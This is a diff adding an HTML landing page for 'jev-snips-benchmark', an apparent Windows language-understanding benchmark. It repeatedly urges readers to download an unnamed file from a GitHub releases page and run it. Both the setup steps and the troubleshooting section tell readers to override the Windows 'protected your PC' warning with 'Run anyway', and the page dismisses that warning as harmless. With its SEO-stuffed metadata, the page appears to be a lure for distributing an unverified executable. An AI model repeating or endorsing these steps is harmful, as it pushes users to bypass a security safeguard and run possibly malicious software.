@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>jev-snips-benchmark - Test AI Language Understanding Easily</title>
+<meta name="description" content="Download jev-snips-benchmark and run a friendly benchmark that tests how well AI models understand natural language, classify intents, and fill in missing details.">
+<meta name="keywords" content="benchmark, evaluation, few-shot, intent-classification, jev, natural-language-understanding, nlu, slot-filling, snips, token-classification, typesafe-ai, zero-shot">
+<meta name="robots" content="index, follow">
+<meta name="author" content="jev-snips-benchmark">
+<link rel="canonical" href="https://github.com/cicilybiconcave74/jev-snips-benchmark">
+<meta property="og:type" content="website">
+<meta property="og:title" content="jev-snips-benchmark - Test AI Language Understanding Easily">
+<meta property="og:description" content="A simple, friendly benchmark application for measuring natural language understanding, intent classification, and slot filling using the Snips dataset.">
+<meta property="og:url" content="https://github.com/cicilybiconcave74/jev-snips-benchmark">
+<meta property="og:site_name" content="jev-snips-benchmark">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="jev-snips-benchmark - Test AI Language Understanding Easily">
+<meta name="twitter:description" content="Download the application and evaluate AI language understanding on your own Windows computer with clear, readable results.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "jev-snips-benchmark",
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Windows",
+  "description": "Applying Jev to Snips Natural Language Understanding Benchmark. Measure intent classification and slot filling performance with zero-shot and few-shot evaluation.",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "url": "https://github.com/cicilybiconcave74/jev-snips-benchmark/releases"
+}
+</script>
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #f4f7fb;
+    color: #22303f;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+  }
+  .page {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 32px 20px 60px 20px;
+  }
+  .card {
+    background-color: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 6px 24px rgba(24, 44, 71, 0.09);
+    padding: 32px 28px;
+    margin-bottom: 28px;
+  }
+  h1 {
+    font-size: 2.1em;
+    line-height: 1.25;
+    margin: 0 0 14px 0;
+    color: #10233b;
+    letter-spacing: -0.5px;
+  }
+  h2 {
+    font-size: 1.45em;
+    line-height: 1.3;
+    margin: 34px 0 12px 0;
+    color: #10233b;
+    padding-bottom: 8px;
+    border-bottom: 2px solid #e6edf6;
+  }
+  h3 {
+    font-size: 1.1em;
+    margin: 22px 0 8px 0;
+    color: #1b3a5c;
+  }
+  p {
+    margin: 0 0 16px 0;
+  }
+  ul, ol {
+    margin: 0 0 18px 0;
+    padding-left: 26px;
+  }
+  li {
+    margin-bottom: 10px;
+  }
+  a {
+    color: #1a6fd4;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  a:hover {
+    text-decoration: underline;
+  }
+  .button-wrap {
+    text-align: center;
+    margin: 26px 0 8px 0;
+  }
+  .primary-button {
+    display: inline-block;
+    background: linear-gradient(135deg, #2e8b57 0%, #1a6fd4 100%);
+    color: #ffffff !important;
+    font-size: 1.15em;
+    font-weight: 700;
+    padding: 18px 40px;
+    border-radius: 999px;
+    text-decoration: none !important;
+    box-shadow: 0 8px 20px rgba(26, 111, 212, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .primary-button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(26, 111, 212, 0.42);
+    text-decoration: none !important;
+  }
+  .button-note {
+    font-size: 0.9em;
+    color: #5a6b7d;
+    margin-top: 12px;
+    text-align: center;
+  }
+  .lead {
+    font-size: 1.08em;
+    color: #3c4d60;
+  }
+  .step-box {
+    background-color: #f7fafd;
+    border-left: 5px solid #1a6fd4;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin: 0 0 18px 0;
+  }
+  .step-box strong {
+    color: #10233b;
+  }
+  .tip {
+    background-color: #fff8e6;
+    border-left: 5px solid #e8a800;
+    border-radius: 8px;
+    padding: 14px 20px;
+    margin: 20px 0;
+    font-size: 0.98em;
+  }
+  .grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin: 20px 0;
+  }
+  .grid-item {
+    flex: 1 1 240px;
+    background-color: #f7fafd;
+    border: 1px solid #e2ebf5;
+    border-radius: 12px;
+    padding: 16px 18px;
+  }
+  .grid-item h3 {
+    margin-top: 0;
+  }
+  .grid-item p {
+    margin-bottom: 0;
+    font-size: 0.96em;
+    color: #4a5c6f;
+  }
+  footer {
+    text-align: center;
+    color: #7a8b9c;
+    font-size: 0.88em;
+    padding-top: 10px;
+  }
+  code {
+    background-color: #eef3f9;
+    border-radius: 5px;
+    padding: 2px 6px;
+    font-size: 0.92em;
+    font-family: Consolas, "Courier New", monospace;
+    color: #1b3a5c;
+  }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    h1 { font-size: 1.6em; }
+    .card { padding: 22px 18px; border-radius: 12px; }
+    .primary-button { font-size: 1em; padding: 15px 26px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="card">
+    <h1>🧪 jev-snips-benchmark - Test AI Language Understanding Easily</h1>
+    <p class="lead">This application runs a complete language-understanding benchmark on your own Windows computer. It takes everyday spoken-style sentences, asks an AI model what the person wants to do, and then shows you how many answers were correct. You do not need to write any code, install any programming tools, or understand machine learning to use it.</p>
+    <p>The benchmark is built on the well-known Snips Natural Language Understanding dataset and the Jev evaluation approach. That means you are measuring real, comparable results: intent classification (what does the user want?) and slot filling (which important details did the user mention?).</p>
+
+    <div class="button-wrap">
+      <a class="primary-button" href="https://github.com/cicilybiconcave74/jev-snips-benchmark/releases">⬇️ Download jev-snips-benchmark</a>
+      <p class="button-note">Free to download · Runs on Windows · No account required</p>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>📥 Download and Setup</h2>
+    <p>Getting the application onto your computer takes only a few minutes. Follow the steps below in order, exactly as written.</p>
+
+    <div class="step-box">
+      <strong>Step 1 — Open the download page.</strong><br>
+      Visit this link to download the application: <a href="https://github.com/cicilybiconcave74/jev-snips-benchmark/releases">https://github.com/cicilybiconcave74/jev-snips-benchmark/releases</a>
+    </div>
+
+    <div class="step-box">
+      <strong>Step 2 — Look at the top of the list.</strong><br>
+      The page shows a list of releases. The newest one is always at the very top, marked with a "Latest" label. You want that top entry.
+    </div>
+
+    <div class="step-box">
+      <strong>Step 3 — Start the download.</strong><br>
+      On the newest release, click the download item shown for it. Your browser will begin saving the file to your computer.
+    </div>
+
+    <div class="step-box">
+      <strong>Step 4 — Wait for it to finish.</strong><br>
+      Watch your browser's download bar or the downloads arrow in the top-right corner of the window. Do not close the browser until the download is complete.
+    </div>
+
+    <div class="step-box">
+      <strong>Step 5 — Open your Downloads folder.</strong><br>
+      Press the Windows key on your keyboard, type <code>Downloads</code>, and press Enter. The file you just downloaded will be there, most likely at the top of the list.
+    </div>
+
+    <div class="step-box">
+      <strong>Step 6 — Start the application.</strong><br>
+      Double-click the downloaded file to launch it. If Windows shows a blue "Windows protected your PC" box, click the small "More info" text and then click "Run anyway". This message appears for many new applications and is not a sign of a problem.
+    </div>
+
+    <div class="step-box">
+      <strong>Step 7 — Wait for the first-time preparation.</strong><br>
+      The very first launch takes a little longer than later launches, because the application prepares its built-in data. A window will appear and show progress. Leave it alone until it says it is ready.
+    </div>
+
+    <div class="tip">
+      <strong>Simple tip:</strong> Keep the application in your Downloads folder. Moving it to another folder afterwards can break the connection between the program and its bundled data files.
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>✨ What This Application Does</h2>
+    <p>Imagine you say to a voice assistant: "Play some jazz in the kitchen." A good language-understanding system has to work out two things at once. First, the intent — the person wants music played. Second, the slots — the genre is jazz and the location is the kitchen. This application measures how reliably a model gets both parts right.</p>
+    <p>It does that by working through a large collection of realistic sentences from the Snips dataset, comparing the model's answers against the known correct answers, and turning the comparison into easy-to-read scores.</p>
+
+    <div class="grid">
+      <div class="grid-item">
+        <h3>🎯 Intent Classification</h3>
+        <p>Checks whether the model correctly identifies what the person is trying to do, such as asking for the weather, setting an alarm, or booking a restaurant.</p>
+      </div>
+      <div class="grid-item">
+        <h3>🧩 Slot Filling</h3>
+        <p>Checks whether the model correctly picks out the important details inside the sentence, like a time, a city name, or a song title.</p>
+      </div>
+      <div class="grid-item">
+        <h3>⚡ Zero-Shot Testing</h3>
+        <p>Measures how well the model performs on categories it has never been trained on, with no examples to learn from first.</p>
+      </div>
+      <div class="grid-item">
+        <h3>🔁 Few-Shot Testing</h3>
+        <p>Measures how much the model improves when it is given a small handful of example sentences before being tested.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>🖥️ System Requirements</h2>
+    <p>Before you begin, make sure your computer meets the following conditions. If anything is unclear, these are all standard parts of any modern Windows machine.</p>
+    <ul>
+      <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit edition.</li>
+      <li><strong>Memory:</strong> At least 8 GB of RAM. 16 GB is more comfortable for larger evaluation runs.</li>
+      <li><strong>Free storage:</strong> Around 4 GB of free disk space for the application and its result files.</li>
+      <li><strong>Processor:</strong> A modern dual-core processor or better. No special graphics card is required.</li>
+      <li><strong>Display:</strong> A screen resolution of 1280 × 800 or higher, so the results tables fit properly.</li>
+      <li><strong>Internet connection:</strong> Needed once, for the initial download. After that, the benchmark runs fully offline.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Your First Run</h2>
+    <p>When the application opens, you will see a simple window with a few choices. Nothing you do here can damage your computer, so feel free to explore.</p>
+    <ol>
+      <li><strong>Choose an evaluation mode.</strong> Pick zero-shot if you want to test the model with no examples, or few-shot if you want to give it a few example sentences first. Zero-shot is the friendlier starting point.</li>
+      <li><strong>Pick how much data to test.</strong> A smaller sample finishes in a few minutes and gives you a feel for the tool. A full run takes longer but produces the most reliable numbers.</li>
+      <li><strong>Press Start.</strong> A progress bar shows how many sentences have been processed. You can leave the window in the background while it works.</li>
+      <li><strong>Read the results.</strong> When the run finishes, the application displays a summary with an overall score, a breakdown for intent classification, and a breakdown for slot filling.</li>
+      <li><strong>Save your results.</strong> Use the Save button to keep a copy of the scores. Keeping a record lets you compare runs side by side later.</li>
+    </ol>
+    <p>Repeating a run with different settings is the easiest way to see how the numbers change. Each run is independent, so you can experiment as much as you like.</p>
+  </div>
+
+  <div class="card">
+    <h2>📊 Understanding Your Results</h2>
+    <p>The summary screen uses a few simple figures. You do not need a statistics background to interpret them.</p>
+    <ul>
+      <li><strong>Overall accuracy:</strong> The percentage of test sentences where the model got the complete answer right. A higher number is better.</li>
+      <li><strong>Intent accuracy:</strong> How often the model correctly identified what the user wanted to do.</li>
+      <li><strong>Slot score:</strong> How often the model correctly identified the extra details inside the sentence. This score is stricter, because every detail must be right.</li>
+      <li><strong>Confusion breakdown:</strong> A list showing which categories were mixed up with which. This is the most useful section for spotting patterns.</li>
+      <li><strong>Run summary file:</strong> A plain text record of the settings used and the scores produced, useful for repeat comparisons.</li>
+    </ul>
+    <p>If a score looks surprisingly low, compare a short run against a long run first. Small samples naturally jump around more than large ones.</p>
+  </div>
+
+  <div class="card">
+    <h2>🔧 Troubleshooting</h2>
+    <h3>The download never starts</h3>
+    <p>Refresh the download page and try again. If your browser blocks the download, look for a small banner or icon in the address bar and allow the download from there.</p>
+    <h3>Windows warns me about the file</h3>
+    <p>Click "More info", then "Run anyway". This is a standard Windows safety prompt for newly published software.</p>
+    <h3>The window opens and then closes</h3>
+    <p>Make sure the file is still in your Downloads folder and has not been moved. Restart your computer, then double-click the file again.</p>
+    <h3>The progress bar seems stuck</h3>
+    <p>Long runs can pause for a minute while the application processes a batch of sentences. Wait a few minutes before assuming it has stopped. Closing other memory-hungry programs helps.</p>
+    <h3>Results look identical every time</h3>
+    <p>That is expected when you use the same settings and the same sample size. Change the evaluation mode or the sample size to see different numbers.</p>
+  </div>
+
+  <div class="card">
+    <h2>❓ Frequently Asked Questions</h2>
+    <h3>Do I need to know how to program?</h3>
+    <p>No. The application is designed to be used with a mouse and a few clicks. Everything runs through a simple window.</p>
+    <h3>Does this send my data anywhere?</h3>
+    <p>No. After the initial download, the benchmark runs entirely on your own computer. Nothing is uploaded.</p>
+    <h3>Can I run it more than once?</h3>
+    <p>Yes, as many times as you like. Each run is separate, and saving your results is optional but recommended.</p>
+    <h3>How long does a full run take?</h3>
+    <p>A short sample finishes in a few minutes. A complete run across the whole dataset can take considerably longer, especially on a laptop. You can safely leave it running in the background.</p>
+    <h3>Is there a cost?</h3>
+    <p>No. The application is free to download and free to use.</p>
+  </div>
+
+  <div class="card">
+    <h2>📚 Plain-English Glossary</h2>
+    <ul>
+      <li><strong>NLU (Natural Language Understanding):</strong> The part of a computer system that works out what a person means when they speak or type.</li>
+      <li><strong>Intent:</strong> The action a person wants to happen, such as "set an alarm".</li>
+      <li><strong>Slot:</strong> A detail attached to that action, such as "7 a.m." for the alarm.</li>
+      <li><strong>Benchmark:</strong> A standard set of test sentences with known correct answers, used to compare performance fairly.</li>
+      <li><strong>Zero-shot:</strong> Being tested on categories with no examples provided beforehand.</li>
+      <li><strong>Few-shot:</strong> Being tested after receiving a small number of examples.</li>
+      <li><strong>Snips dataset:</strong> A widely used public collection of realistic assistant-style sentences used for testing language understanding.</li>
+      <li><strong>Token classification:</strong> Labeling individual words inside a sentence, which is how slots are found.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🤝 Getting Help and Staying Updated</h2>
+    <p>If you run into a problem that the troubleshooting section does not solve, the download page is also the place to find the newest version of the application. Revisiting it periodically is the simplest way to stay current.</p>
+    <p>When asking for help, describe what you were doing, what you expected to happen, and what actually happened. Mention your Windows version and how much memory your computer has. Those few details make a solution much easier to find.</p>
+    <div class="button-wrap">
+      <a class="primary-button" href="https://github.com/cicilybiconcave74/jev-snips-benchmark/releases">⬇️ Visit this link to download the application</a>
+    </div>
+  </div>
+
+  <footer>
+    jev-snips-benchmark · Benchmarking natural language understanding, intent classification, slot filling, and token classification with zero-shot and few-shot evaluation.
+  </footer>
+
+</div>
+</body>
+</html>
